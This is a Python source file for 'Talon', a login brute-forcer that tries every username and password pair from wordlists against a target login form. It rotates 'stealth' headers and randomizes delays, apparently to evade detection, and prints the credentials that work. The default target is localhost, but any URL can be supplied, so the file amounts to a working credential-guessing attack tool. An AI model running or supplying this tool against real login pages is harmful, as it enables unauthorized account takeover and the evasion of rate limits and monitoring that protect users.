import requests
import argparse
import random
import time

from MistRaven import stealth_headers, stealth_sleep
from libTalon import try_login

def stealth_sleep(base_delay):
    time.sleep(random.uniform(base_delay * 0.7, base_delay * 1.3))

def brute_force(url, userlist, passlist, fields, fail_string, delay):
    with open(userlist, 'r') as users, open(passlist, 'r') as passwords:
        for username in users:
            username = username.strip()
            for password in passwords:
                password = password.strip()
                headers = stealth_headers()

                try:
                    success = try_login(url, username, password, fields, fail_string, headers)
                    if success is True:
                        print(f"🟢 Success → {username}:{password}")
                    elif success is False:
                        print(f"🔴 Failed  → {username}:{password}")
                    else:
                        print(f"⚠️ Network error on {username}:{password}")
                except Exception as e:
                    print(f"⚠️ Error: {e}")
                
                stealth_sleep(delay)
            passwords.seek(0)  # Reset for next user

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Talon: Adaptive Login Bruteforcer")

    # Defaults for local testing
    parser.add_argument("-u", "--url", default="http://localhost:5000/login", help="Target login URL")
    parser.add_argument("-U", "--userlist", default="users.txt", help="Path to username wordlist")
    parser.add_argument("-P", "--passlist", default="passwords.txt", help="Path to password wordlist")
    parser.add_argument("-f", "--fields", default="username,password", help="Form fields in order (e.g. username,password)")
    parser.add_argument("-s", "--fail", default="Invalid login", help="Failure string in response")
    parser.add_argument("-d", "--delay", type=float, default=1.5, help="Base delay between attempts")

    args = parser.parse_args()
    fields = args.fields.split(",")

    brute_force(args.url, args.userlist, args.passlist, fields, args.fail, args.delay)
